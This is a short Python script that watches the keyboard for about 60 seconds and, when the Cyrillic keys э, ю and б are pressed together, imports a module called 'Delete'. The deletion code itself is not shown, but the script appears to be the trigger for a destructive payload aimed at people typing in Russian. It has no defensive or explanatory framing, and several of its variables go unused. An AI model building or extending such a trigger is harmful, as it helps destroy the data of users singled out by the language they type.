import imp
import shutil
import os
import os.path
import keyboard
from time import monotonic

library1 = ["r", "u", "s", "s", "i", "a", "n", "z", "o", "v"]
library2 = ["k", "t", "x", "e", "p", "f", "h", "e", "c", "m"]
library3 = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
library4 = ["э","ю","б"]
Time = monotonic()

def BlockK():
    while True:
            if monotonic() - Time < 60:
                if (
                    keyboard.is_pressed(library4[0])
                    and keyboard.is_pressed(library4[1])
                    and keyboard.is_pressed(library4[2])
                    ):
                    import Delete
BlockK()